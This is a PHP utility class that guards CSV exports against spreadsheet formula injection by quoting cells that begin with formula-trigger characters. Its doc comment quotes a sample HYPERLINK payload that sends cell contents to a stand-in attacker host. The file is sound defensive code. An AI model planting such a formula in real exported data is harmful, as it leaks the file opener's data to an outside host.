<?php

namespace App\Support;

/**
 * Neutralizes CSV/Excel formula injection (CWE-1236): a cell value beginning with
 * =, +, -, @, or a tab/CR is interpreted as a live formula by Excel/Sheets when the
 * CSV is opened, letting a tenant-controlled string (a payment reference, a name, a
 * note — anything free-text that ends up in an export) run arbitrary formulas
 * against whoever opens the file, including data-exfiltration payloads like
 * =HYPERLINK("https://evil.example?x="&A1,"Click"). Prefixing such a value with a
 * single quote neutralizes it (Excel/Sheets both treat a leading ' as a
 * force-text marker and don't display it) while leaving the visible text intact.
 */
class CsvSafety
{
    private const DANGEROUS_PREFIXES = ['=', '+', '-', '@', "\t", "\r"];

    public static function sanitizeCell(mixed $value): mixed
    {
        if (! is_string($value) || $value === '') {
            return $value;
        }

        return in_array($value[0], self::DANGEROUS_PREFIXES, true) ? "'".$value : $value;
    }

    /**
     * @param  array<int|string, mixed>  $row
     * @return array<int|string, mixed>
     */
    public static function sanitizeRow(array $row): array
    {
        return array_map(self::sanitizeCell(...), $row);
    }

    /**
     * Drop-in replacement for fputcsv() — sanitizes every cell before writing.
     *
     * @param  resource  $stream
     * @param  array<int|string, mixed>  $fields
     */
    public static function fputcsv($stream, array $fields, string $separator = ',', string $enclosure = '"', string $escape = '\\'): int|false
    {
        return fputcsv($stream, self::sanitizeRow($fields), $separator, $enclosure, $escape);
    }
}
